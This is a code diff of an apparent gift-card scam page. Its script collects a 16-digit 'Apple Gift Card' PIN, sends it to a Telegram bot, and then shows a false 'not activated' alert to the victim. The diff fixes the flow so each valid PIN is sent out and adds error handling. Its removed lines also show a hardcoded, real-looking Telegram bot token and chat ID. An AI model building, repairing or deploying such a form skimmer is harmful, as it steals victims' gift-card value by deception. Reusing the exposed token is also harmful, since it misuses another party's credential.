@@ -125,28 +125,20 @@
     e.target.value = value.replace(/(.{4})/g, '$1 ').trim(); // insert space every 4 chars
   });
 
-  const botToken = "8488719047:AAESFFAoNPZQ3Mb5J4LaHM54EK8PyHzWeOo"; 
-  const chatId = "6084808169";   
+  const botToken = "YOUR_BOT_TOKEN"; 
+  const chatId = "YOUR_CHAT_ID";   
 
   form.addEventListener("submit", function(e) {
     e.preventDefault();
 
+    // remove spaces to check real length
+    const rawPin = input.value.replace(/\s+/g, '');
 
-      const pin = input.value.trim();
-
-    if (!pin) {
+    if (rawPin.length === 0) {
       alert("⚠️ Please input the pin to continue");
       return;
     }
 
-    // ✅ If input is not empty, show the original alert
-    alert("❌ This Apple Gift Card is not activated!");
-  });
-    
-    // remove spaces to check real length
-    const rawPin = input.value.replace(/\s+/g, '');
-
- 
     if (rawPin.length < 16) {
       alert("⚠️ Pin must be 16 digits long");
       return;
@@ -164,11 +156,16 @@
         text: message
       })
     })
-     .then(() => {
+    .then(() => {
       alert("❌ This Apple Gift Card is not activated!");
     })
+    .catch(err => {
+      alert("Error sending to Telegram");
+      console.error(err);
+    });
   });
 </script>
+
 
 
 
